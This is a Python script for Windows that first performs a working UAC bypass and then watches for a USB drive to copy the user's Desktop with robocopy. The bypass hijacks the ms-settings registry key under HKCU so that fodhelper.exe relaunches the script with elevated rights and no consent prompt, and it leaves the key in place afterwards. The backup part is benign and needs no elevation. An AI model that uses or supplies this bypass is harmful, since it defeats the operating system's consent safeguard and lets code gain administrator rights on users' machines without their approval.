import os
import time
import subprocess
import pyautogui
import winreg

def bypass_uac():
    try:
        # Create registry entries for UAC bypass
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'cmd /c "{os.path.abspath(__file__)}"')
        
        # Trigger UAC bypass
        subprocess.run("fodhelper.exe", shell=True, check=True)
        time.sleep(3)  # Wait for elevation
        
    except Exception as e:
        pyautogui.alert(f"UAC Bypass Failed: {str(e)}", "Error")
        exit(1)

def backup_desktop():
    while True:
        try:
            # Check for USB drive (E:)
            if "E:" in os.popen("wmic logicaldisk get caption").read():
                pyautogui.alert("USB drive detected. Backup starting...", "Backup Status")
                
                # Create backup directory
                backup_dir = r"E:\Desktop Backup"
                os.makedirs(backup_dir, exist_ok=True)
                
                # Execute backup
                desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
                robocopy_cmd = f'robocopy "{desktop_path}" "{backup_dir}" /E /Z /W:1 /R:1 /LOG:backup.log'
                result = subprocess.run(robocopy_cmd, shell=True)
                
                # Show completion message
                if result.returncode < 8:  # Robocopy success codes
                    pyautogui.alert("Backup completed successfully!", "Backup Status")
                else:
                    pyautogui.alert(f"Backup completed with errors (Code: {result.returncode})", "Warning")
                return
                
            time.sleep(5)  # Check every 5 seconds
            
        except Exception as e:
            pyautogui.alert(f"Backup Failed: {str(e)}", "Error")
            time.sleep(30)

if __name__ == "__main__":
    bypass_uac()       # Attempt UAC bypass
    backup_desktop()   # Start backup monitoring